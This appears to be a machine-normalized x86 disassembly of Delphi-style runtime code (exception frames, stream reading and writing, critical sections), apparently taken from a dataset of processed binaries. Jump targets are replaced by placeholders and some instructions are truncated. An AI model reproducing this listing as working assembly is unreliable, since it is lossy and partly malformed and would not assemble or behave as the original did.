mov eax [ eax + 0x34 ]
mov edx [ ebp - 0x10 ]
call sub_4139c8
mov edx [ eax ]
call [ edx + 0xc ]
inc [ ebp - 0x10 ]
dec ebx
jne r-xdata
sub_4182f8
call sub_40274c
mov edx [ eax + 0x4 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x10 ]
test al al
jne r-xdata
call sub_403a74
jmp r-xdata
call sub_403a20
xor eax eax
push ebp
push r-xdata
push [ fs : eax ]
mov [ fs : eax ] esp
call sub_4163fc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418368
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
sub_418327
xor edx edx
mov eax [ ebp - 0x8 ]
call sub_4165a4
cmp [ ebp - 0x8 ] 0x0
jne r-xdata
call sub_403a20
call sub_403a74
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418368
mov eax [ rw-data ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
mov eax [ ebp - 0xc ]
call sub_40326c
sub_418394
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_41843e
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_418411
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_418650
cmp al 0xb
je r-xdata
mov eax ebx
call sub_41072c
mov eax [ eax + 0x1 ]
mov esi [ eax ]
xor ebx ebx
call sub_4166ec
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_416724
cmp eax 0x1f
ja r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418445
lea eax [ ebp - 0x8 ]
call sub_403fbc
retn
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_418474
cmp [ ebp - 0x8 ] 0x0
je r-xdata
bts ebx eax
jmp r-xdata
sub_418474
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov edx esp
mov ecx 0x1
mov eax ebx
call sub_416c14
xor ecx ecx
mov cl [ esp ]
mov eax esi
xor edx edx
call sub_4040ac
mov eax esi
call j_sub_404488
mov edx eax
xor ecx ecx
mov cl [ esp ]
mov eax ebx
call sub_416c14
pop edx
pop esi
pop ebx
retn
sub_4184b0
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x8 ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_41855d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_416bf0
sub al 0x12
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax ebx
call sub_41856c
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_404244
jmp r-xdata
sub al 0x2
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418564
lea eax [ ebp - 0x8 ]
call sub_40469c
retn
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax ebx
call sub_418650
sub al 0x6
je r-xdata
lea edx [ ebp - 0x4 ]
mov ecx 0x1
mov eax ebx
call sub_416c14
jmp r-xdata
sub al 0x6
je r-xdata
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_404608
mov edx [ esi ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
call sub_416c14
lea edx [ ebp - 0x4 ]
mov ecx 0x4
mov eax ebx
call sub_416c14
jmp r-xdata
jmp r-xdata
call sub_4166ec
sub_41856c
push ebp
mov ebp esp
push 0x0
push 0x0
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_418643
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_416bf0
sub al 0x6
je r-xdata
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_4184b0
mov edx [ ebp - 0xc ]
mov eax esi
call sub_4047e8
jmp r-xdata
sub al 0x6
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_41864a
lea eax [ ebp - 0xc ]
call sub_403fbc
lea eax [ ebp - 0x8 ]
call sub_403fbc
retn
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax ebx
call sub_418650
sub al 0x12
je r-xdata
lea edx [ ebp - 0x4 ]
mov ecx 0x4
mov eax ebx
call sub_416c14
mov eax esi
mov edx [ ebp - 0x4 ]
call sub_4048e4
mov ecx [ ebp - 0x4 ]
add ecx ecx
mov edx [ esi ]
mov eax ebx
call sub_416c14
jmp r-xdata
sub al 0x2
je r-xdata
lea edx [ ebp - 0x4 ]
mov ecx 0x4
mov eax ebx
call sub_416c14
lea eax [ ebp - 0x8 ]
mov edx [ ebp - 0x4 ]
call sub_404608
mov edx [ ebp - 0x8 ]
mov ecx [ ebp - 0x4 ]
mov eax ebx
call sub_416c14
mov edx esi
mov eax [ ebp - 0x8 ]
call sub_4059f8
jmp r-xdata
jmp r-xdata
call sub_4166ec
sub_418664
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_4186a0
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_418474
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4186a7
lea eax [ ebp - 0x4 ]
call sub_403fbc
retn
sub_4186ac
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
add ebx 0xfffffffc
jmp r-xdata
mov eax [ ebx ]
call sub_4168ac
test al al
je r-xdata
mov eax [ ebx ]
call sub_418760
mov eax [ ebx ]
call sub_417818
pop ebx
pop ebp
retn
sub_4186d4
push ebp
mov ebp esp
push ecx
push ebx
mov ebx eax
lea edx [ ebp - 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
call sub_416c14
mov edx [ ebp - 0x4 ]
imul edx ebx
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_418b58
pop ebx
pop ecx
pop ebp
retn
sub_418704
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
add ebx 0xfffffffc
jmp r-xdata
mov eax [ ebx ]
call sub_4168ac
test al al
je r-xdata
mov eax [ ebx ]
call sub_416bf0
add al 0xfe
sub al 0x3
jae r-xdata
mov eax [ ebx ]
call sub_417818
pop ebx
pop ebp
retn
mov eax [ ebx ]
mov edx 0x1
call sub_418b58
jmp r-xdata
mov eax [ ebx ]
call sub_418760
mov eax [ ebx ]
call sub_4168ac
test al al
je r-xdata
mov eax [ ebx ]
call sub_4188fc
mov eax [ ebx ]
call sub_417818
sub_418760
push ebp
mov ebp esp
add esp 0xfffffff8
xor edx edx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_4188ef
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_418650
and eax 0x7f
cmp eax 0x14
ja r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4188f6
lea eax [ ebp - 0x8 ]
call sub_403fbc
retn
jmp [ eax * 4 + jump_table_418797 ]
push ebp
call sub_4186ac
pop ecx
jmp r-xdata
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_418b58
jmp r-xdata
mov edx 0x2
mov eax [ ebp - 0x4 ]
call sub_418b58
jmp r-xdata
mov edx 0x4
mov eax [ ebp - 0x4 ]
call sub_418b58
jmp r-xdata
mov edx 0xa
mov eax [ ebp - 0x4 ]
call sub_418b58
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_418474
jmp r-xdata
push ebp
mov eax 0x1
call sub_4186d4
pop ecx
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_418664
jmp r-xdata
push ebp
mov eax 0x1
call sub_4186d4
pop ecx
jmp r-xdata
push ebp
call sub_418704
pop ecx
jmp r-xdata
mov edx 0x4
mov eax [ ebp - 0x4 ]
call sub_418b58
jmp r-xdata
mov edx 0x8
mov eax [ ebp - 0x4 ]
call sub_418b58
jmp r-xdata
mov edx 0x8
mov eax [ ebp - 0x4 ]
call sub_418b58
jmp r-xdata
push ebp
mov eax 0x2
call sub_4186d4
pop ecx
jmp r-xdata
mov edx 0x8
mov eax [ ebp - 0x4 ]
call sub_418b58
jmp r-xdata
push ebp
mov eax 0x1
call sub_4186d4
pop ecx
sub_4188fc
push ebp
mov ebp esp
push 0x0
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_418939
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax ebx
call sub_418474
mov eax ebx
call sub_418760
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418940
lea eax [ ebp - 0x4 ]
call sub_403fbc
retn
sub_418944
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0xc ] ecx
mov ebx eax
xor eax eax
push ebp
push sub_4189dc
push [ fs : eax ]
mov [ fs : eax ] esp
test dl dl
je r-xdata
mov eax ebx
call sub_4168ac
test al al
je r-xdata
lea ecx [ ebp - 0x8 ]
lea edx [ ebp - 0x1 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x24 ]
lea edx [ ebp - 0xc ]
mov eax ebx
call sub_418474
lea edx [ ebp - 0x10 ]
mov eax ebx
call sub_418474
jmp r-xdata
mov eax ebx
call sub_4188fc
mov eax ebx
call sub_417818
jmp r-xdata
mov eax ebx
call sub_4168ac
test al al
je r-xdata
mov dl 0x1
mov eax ebx
call sub_418944
mov eax ebx
call sub_417818
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4189e3
lea eax [ ebp - 0x10 ]
mov edx 0x2
call sub_403fe0
retn
sub_4189ec
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
xor ebx ebx
mov [ ebp - 0x8 ] ebx
mov edi ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_418a91
push [ fs : eax ]
mov [ fs : eax ] esp
lea eax [ ebp - 0x8 ]
mov edx esi
call sub_404054
xor eax eax
mov [ ebp - 0x4 ] eax
mov esi [ ebx + 0x1c ]
test esi esi
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax esi
call sub_419888
mov [ ebp - 0x4 ] eax
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418a98
lea eax [ ebp - 0x8 ]
call sub_403fbc
retn
cmp [ ebx + 0x52 ] 0x0
je r-xdata
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
push edi
lea eax [ ebp - 0x4 ]
push eax
mov ecx [ ebp - 0x8 ]
mov edx ebx
mov eax [ ebx + 0x54 ]
call [ ebx + 0x50 ]
mov eax [ ebp - 0x8 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b50c
call sub_4039f8
sub_418abc
push ebx
push esi
push edi
mov esi ecx
mov ebx edx
cmp [ eax + 0x42 ] 0x0
je r-xdata
mov edx [ esi ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x18 ]
pop edi
pop esi
pop ebx
retn
push esi
mov edi eax
mov ecx ebx
mov edx eax
mov eax [ edi + 0x44 ]
call [ edi + 0x40 ]
sub_418ae4
push ebx
push esi
push ecx
mov esi edx
mov ebx eax
mov ecx esi
mov edx [ ebx + 0x18 ]
mov eax ebx
call sub_416b44
mov [ esp ] eax
cmp [ esp ] 0x0
jne r-xdata
cmp [ ebx + 0x62 ] 0x0
je r-xdata
cmp [ ebx + 0x1c ] 0x0
je r-xdata
cmp [ esp ] 0x0
je r-xdata
push esp
mov ecx esi
mov edx ebx
mov eax [ ebx + 0x64 ]
call [ ebx + 0x60 ]
mov eax [ ebx + 0x1c ]
cmp eax [ ebx + 0x18 ]
je r-xdata
mov eax esi
call sub_413068
mov edx [ r-xdata ]
mov eax [ esp ]
call sub_403498
test al al
jne r-xdata
mov ecx esi
mov edx [ ebx + 0x1c ]
mov eax ebx
call sub_416b44
mov [ esp ] eax
mov eax [ esp ]
pop edx
pop esi
pop ebx
retn
sub_418b58
push ebx
push esi
add esp 0xffffff00
mov ebx edx
mov esi eax
test ebx ebx
jle r-xdata
add esp 0x100
pop esi
pop ebx
retn
cmp ebx 0x100
jle r-xdata
mov edx esp
mov ecx ebx
mov eax esi
call sub_416c14
xor ebx ebx
mov edx esp
mov ecx 0x100
mov eax esi
call sub_416c14
sub ebx 0x100
jmp r-xdata
test ebx ebx
jg r-xdata
sub_418ba0
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
xor edx edx
mov [ ebp - 0x18 ] edx
mov [ ebp - 0x1c ] edx
mov ebx eax
xor eax eax
push ebp
push sub_418d49
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov dl 0xa
call sub_416778
xor eax eax
mov [ ebp - 0x8 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_40323c
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_418d24
push [ fs : eax ]
mov [ fs : eax ] esp
mov dl 0x1
mov eax [ r-xdata ]
call sub_40323c
mov [ ebp - 0x8 ] eax
lea edx [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx 0x4
call sub_416c14
mov eax [ ebp - 0x10 ]
cdq
push edx
push eax
mov eax [ ebp - 0x4 ]
call sub_4156a4
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x4 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov ecx [ ebp - 0x10 ]
call sub_416c14
push 0x400
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_416034
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_418cff
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x18 ]
mov eax [ ebp - 0xc ]
call sub_4184b0
lea edx [ ebp - 0x10 ]
mov ecx 0x4
mov eax [ ebp - 0xc ]
call sub_416c14
mov eax [ ebp - 0x10 ]
cdq
push edx
push eax
mov eax [ ebp - 0x8 ]
call sub_4156a4
mov eax [ ebp - 0x8 ]
mov edx [ eax + 0x4 ]
mov ecx [ ebp - 0x10 ]
mov eax [ ebp - 0xc ]
call sub_416c14
lea edx [ ebp - 0x14 ]
mov eax [ ebp - 0x18 ]
call sub_4103cc
test al al
je r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b4d0
call sub_4039f8
lea eax [ ebp - 0x1c ]
call sub_405628
mov ecx eax
mov edx r-xdata
mov eax [ ebp - 0x14 ]
call sub_40cdb4
test al al
jne r-xdata
mov eax [ ebp - 0x14 ]
mov ax [ eax + 0x4 ]
mov [ ebx ] ax
mov edx ebx
mov ecx [ ebp - 0x8 ]
mov eax [ ebp - 0x1c ]
mov ebx [ eax ]
call [ ebx + 0xc ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418d06
mov eax [ ebp - 0xc ]
call sub_40326c
retn
sub_418d68
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_418f62
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
call sub_40e928
mov eax [ ebp - 0x4 ]
call sub_416bf0
and eax 0x7f
cmp eax 0x14
ja r-xdata
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b4d0
call sub_4039f8
jmp [ eax * 4 + jump_table_418daa ]
mov eax [ ebp - 0x4 ]
call sub_418650
cmp al 0xd
je r-xdata
mov eax [ ebp - 0x4 ]
call sub_417760
mov edx eax
movsx edx dl
mov eax ebx
mov cl 0xff
call sub_40fc04
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_417760
mov edx eax
movsx edx dx
mov eax ebx
mov cl 0xfe
call sub_40fc04
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_417760
mov edx eax
mov eax ebx
mov cl 0xfc
call sub_40fc04
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_417544
mov eax ebx
call sub_40fc94
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_417588
mov eax ebx
call sub_40fc94
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4175cc
mov eax ebx
call sub_40fcbc
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_41761c
mov eax ebx
call sub_40fca8
jmp r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4184b0
mov edx [ ebp - 0x8 ]
mov eax ebx
call sub_40fcd0
jmp r-xdata
lea edx [ ebp - 0xc ]
mov eax [ ebp - 0x4 ]
call sub_41856c
mov edx [ ebp - 0xc ]
mov eax ebx
call sub_40fcfc
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_418650
cmp al 0x9
sete dl
mov eax ebx
call sub_40fc6c
jmp r-xdata
push ebp
lea eax [ ebp - 0x1c ]
call sub_418ba0
pop ecx
lea edx [ ebp - 0x1c ]
mov eax ebx
call sub_40ec50
jmp r-xdata
mov eax [ ebp - 0x4 ]
call sub_4177cc
push edx
push eax
mov eax ebx
call sub_40fc40
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_418f69
lea eax [ ebp - 0x1c ]
call sub_40e93c
lea eax [ ebp - 0xc ]
call sub_40469c
lea eax [ ebp - 0x8 ]
call sub_403fbc
retn
mov eax ebx
call sub_4104b4
jmp r-xdata
sub_418f70
push esi
push edi
push ebx
mov esi edx
mov ebx ecx
mov edi eax
jmp r-xdata
or ebx ebx
jne r-xdata
mov ecx [ edi + 0xc ]
sub ecx [ edi + 0x10 ]
ja r-xdata
pop ebx
pop edi
pop esi
retn
cmp ecx ebx
jb r-xdata
mov eax edi
call sub_418fbc
mov ecx [ edi + 0xc ]
sub ebx ecx
push edi
mov eax [ edi + 0x8 ]
add eax [ edi + 0x10 ]
add [ edi + 0x10 ] ecx
mov edi eax
mov edx ecx
shr ecx 0x2
cld
[ edi ] [ esi ]
mov ecx edx
and ecx 0x3
[ edi ] [ esi ]
pop edi
mov ecx ebx
sub_418fe8
push ebx
push ecx
mov [ esp ] edx
mov ebx eax
cmp [ esp ] 0xffffff80
jl r-xdata
cmp [ esp ] 0xffff8000
jl r-xdata
cmp [ esp ] 0x7f
jg r-xdata
mov dl 0x4
mov eax ebx
call sub_419158
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_418f70
cmp [ esp ] 0x7fff
jg r-xdata
mov dl 0x2
mov eax ebx
call sub_419158
mov edx esp
mov ecx 0x1
mov eax ebx
call sub_418f70
pop edx
pop ebx
retn
mov dl 0x3
mov eax ebx
call sub_419158
mov edx esp
mov ecx 0x2
mov eax ebx
call sub_418f70
jmp r-xdata
pop edx
pop ebx
retn
sub_41906c
push ebx
push esi
push edi
push ecx
mov edi ecx
mov esi edx
mov ebx eax
mov eax esi
mov edx edi
call sub_4043c8
je r-xdata
mov eax esi
call sub_40427c
mov [ esp ] eax
cmp [ esp ] 0xff
jg r-xdata
mov eax edi
call sub_40427c
mov [ esp ] eax
mov dl 0x14
mov eax ebx
call sub_419158
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_418f70
mov edx edi
mov ecx [ esp ]
mov eax ebx
call sub_418f70
jmp r-xdata
mov dl 0xc
mov eax ebx
call sub_419158
mov edx esp
mov ecx 0x4
mov eax ebx
call sub_418f70
mov dl 0x6
mov eax ebx
call sub_419158
mov edx esp
mov ecx 0x1
mov eax ebx
call sub_418f70
jmp r-xdata
pop edx
pop edi
pop esi
pop ebx
retn
mov edx esi
mov ecx [ esp ]
mov eax ebx
call sub_418f70
sub_419104
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_419149
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax esi
call sub_405a9c
mov ecx [ ebp - 0x4 ]
mov edx esi
mov eax ebx
call sub_41906c
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419150
lea eax [ ebp - 0x4 ]
call sub_403fbc
retn
sub_4191e0
push ebp
mov ebp esp
add esp 0xffffffec
push ebx
push esi
push edi
mov ebx eax
call GetCurrentThreadId
mov edx [ rw-data ]
cmp eax [ edx ]
je r-xdata
test ebx ebx
jle r-xdata
call GetCurrentThreadId
mov [ ebp - 0x14 ] eax
mov [ ebp - 0x10 ] 0x0
lea eax [ ebp - 0x14 ]
push eax
push 0x0
mov ecx [ rw-data ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b50c
call sub_4039f8
call sub_4191b8
mov eax ebx
call sub_4191c4
jmp r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] 0x0
jg r-xdata
xor eax eax
mov [ ebp - 0xc ] eax
push rw-data
call EnterCriticalSection
xor eax eax
push ebp
push sub_41936e
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0xc ]
push eax
push rw-data
call InterlockedExchange
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_41934f
push [ fs : eax ]
mov [ fs : eax ] esp
cmp [ ebp - 0xc ] 0x0
je r-xdata
mov [ ebp - 0x1 ] al
cmp [ ebp - 0x1 ] 0x0
je r-xdata
mov al 0x1
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_419356
mov eax [ ebp - 0xc ]
call sub_40326c
retn
jmp r-xdata
mov eax [ ebp - 0xc ]
cmp [ eax + 0x8 ] 0x0
jg r-xdata
xor edx edx
mov eax [ ebp - 0xc ]
call sub_4139c8
mov [ ebp - 0x8 ] eax
xor edx edx
mov eax [ ebp - 0xc ]
call sub_4138b8
push rw-data
call LeaveCriticalSection
xor eax eax
push ebp
push sub_419319
push [ fs : eax ]
mov [ fs : eax ] esp
xor eax eax
push ebp
push sub_4192ea
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x8 ]
mov ebx [ eax ]
mov eax [ ebx + 0xc ]
call [ ebx + 0x8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
push rw-data
call EnterCriticalSection
retn
sub_419380
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
mov al [ r-xdata ]
mov [ edi + 0x24 ] al
test esi esi
je r-xdata
add esp 0xfffffff0
call sub_403590
mov eax edi
test bl bl
je r-xdata
mov edx edi
mov eax esi
call sub_419538
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_4035e8
pop [ fs : 0x0 ]
add esp 0xc
sub_4193cc
push ebx
push esi
push ecx
call sub_4035f8
mov [ esp ] dl
mov ebx eax
mov eax ebx
call sub_419620
cmp [ ebx + 0x14 ] 0x0
je r-xdata
mov eax ebx
call sub_4195c8
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
jmp r-xdata
mov dl [ esp ]
and dl 0xfc
mov eax ebx
call sub_413f58
cmp [ esp ] 0x0
jle r-xdata
mov edx ebx
call sub_419590
mov esi [ ebx + 0x14 ]
test esi esi
je r-xdata
pop edx
pop esi
pop ebx
retn
mov eax ebx
call sub_4035e0
lea eax [ ebx + 0x14 ]
call sub_40cd80
cmp [ esi + 0x8 ] 0x0
jg r-xdata
mov edx [ esi + 0x8 ]
dec edx
mov eax esi
call sub_4139c8
mov cl 0x1
mov edx ebx
mov esi [ eax ]
call [ esi + 0x10 ]
sub_419450
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
cmp [ ebx + 0x14 ] 0x0
jne r-xdata
cmp eax [ esi + 0x4 ]
je r-xdata
mov edx esi
mov eax [ ebx + 0x14 ]
call sub_413a24
test eax eax
jge r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_40323c
mov [ ebx + 0x14 ] eax
or [ ebx + 0x1c ] 0x100
pop esi
pop ebx
retn
mov edx esi
mov eax [ ebx + 0x14 ]
call sub_41386c
mov edx ebx
mov eax esi
call sub_419450
sub_4194e4
push ebx
push esi
mov esi edx
mov ebx eax
cmp [ ebx + 0x10 ] 0x0
jne r-xdata
mov edx esi
mov eax [ ebx + 0x10 ]
call sub_41386c
mov [ esi + 0x4 ] ebx
pop esi
pop ebx
retn
mov dl 0x1
mov eax [ r-xdata ]
call sub_40323c
mov [ ebx + 0x10 ] eax
sub_419510
push ebx
mov ebx eax
xor eax eax
mov [ edx + 0x4 ] eax
mov eax [ ebx + 0x10 ]
call sub_413b0c
mov eax [ ebx + 0x10 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
pop ebx
retn
call sub_40326c
xor eax eax
mov [ ebx + 0x10 ] eax
sub_419538
push ebx
push esi
push edi
mov ebx edx
mov edi eax
mov edx edi
mov eax ebx
mov si 0xfff5
call sub_403468
mov eax [ ebx + 0x8 ]
push eax
xor ecx ecx
mov edx ebx
mov eax edi
mov esi [ eax ]
call [ esi + 0x20 ]
mov edx ebx
mov eax edi
call sub_4194e4
mov dl 0x1
mov eax ebx
call sub_419a58
test [ edi + 0x1c ] 0x10
je r-xdata
xor ecx ecx
mov edx ebx
mov eax edi
mov ebx [ eax ]
call [ ebx + 0x10 ]
pop edi
pop esi
pop ebx
retn
mov cl 0x1
mov dl 0x1
mov eax ebx
call sub_419a08
sub_419590
push ebx
push esi
push edi
mov ebx edx
mov esi eax
push 0x0
mov ecx [ ebx + 0x8 ]
mov edx ebx
mov eax esi
mov edi [ eax ]
call [ edi + 0x20 ]
mov cl 0x1
mov edx ebx
mov eax esi
mov edi [ eax ]
call [ edi + 0x10 ]
xor edx edx
mov eax ebx
call sub_419a58
mov edx ebx
mov eax esi
call sub_419510
pop edi
pop esi
pop ebx
retn
sub_4195c8
push ebx
push esi
push edi
mov esi eax
jmp r-xdata
mov ebx [ esi + 0x10 ]
test ebx ebx
jne r-xdata
mov eax ebx
call sub_413ab0
mov edi eax
test [ edi + 0x1d ] 0x1
jne r-xdata
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax esi
call sub_419590
jmp r-xdata
mov ax [ r-xdata ]
and ax [ esi + 0x1c ]
mov dx [ r-xdata ]
cmp dx ax
jne r-xdata
mov dl 0x1
mov eax edi
mov ecx [ eax ]
call [ ecx - 0x4 ]
mov edx edi
mov eax esi
call sub_419510
sub_419620
push ebx
push esi
push edi
mov ebx eax
test [ ebx + 0x1c ] 0x8
jne r-xdata
pop edi
pop esi
pop ebx
retn
or [ ebx + 0x1c ] 0x8
mov eax [ ebx + 0x10 ]
test eax eax
je r-xdata
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor edi edi
mov edx edi
mov eax [ ebx + 0x10 ]
call sub_4139c8
call sub_419620
inc edi
dec esi
jne r-xdata
sub_41965c
push ebx
mov ebx eax
mov eax [ ebx + 0x14 ]
test eax eax
je r-xdata
pop ebx
retn
call sub_413b0c
mov eax [ ebx + 0x14 ]
cmp [ eax + 0x8 ] 0x0
jne r-xdata
call sub_40326c
xor eax eax
mov [ ebx + 0x14 ] eax
sub_419680
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_41965c
mov edx ebx
mov eax esi
call sub_41965c
pop esi
pop ebx
retn
sub_41969c
push ebx
push esi
push edi
push ebp
push ecx
mov [ esp ] cl
mov edi edx
mov esi eax
cmp [ esp ] 0x1
jne r-xdata
mov eax [ esi + 0x10 ]
test eax eax
je r-xdata
test edi edi
je r-xdata
pop edx
pop ebp
pop edi
pop esi
pop ebx
retn
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov edx edi
mov eax esi
call sub_419680
mov edx ebx
mov eax [ esi + 0x10 ]
call sub_4139c8
mov cl [ esp ]
mov edx edi
mov ebp [ eax ]
call [ ebp + 0x10 ]
dec ebx
mov eax [ esi + 0x10 ]
mov eax [ eax + 0x8 ]
cmp ebx eax
jl r-xdata
test ebx ebx
jge r-xdata
mov ebx eax
dec ebx
sub_4196f8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov esi edx
mov ebx eax
xor eax eax
mov [ ebp - 0x4 ] eax
mov eax [ esi + 0x20 ]
test eax eax
je r-xdata
push ebx
push sub_4194a4
push ebx
push sub_4194cc
mov ax [ ebx + 0x18 ]
cmp ax [ ebp - 0x4 ]
setne cl
mov edx r-xdata
mov eax esi
mov edi [ eax ]
call [ edi + 0x4 ]
push ebx
push sub_4194b8
push ebx
push sub_4194d8
mov ax [ ebp - 0x2 ]
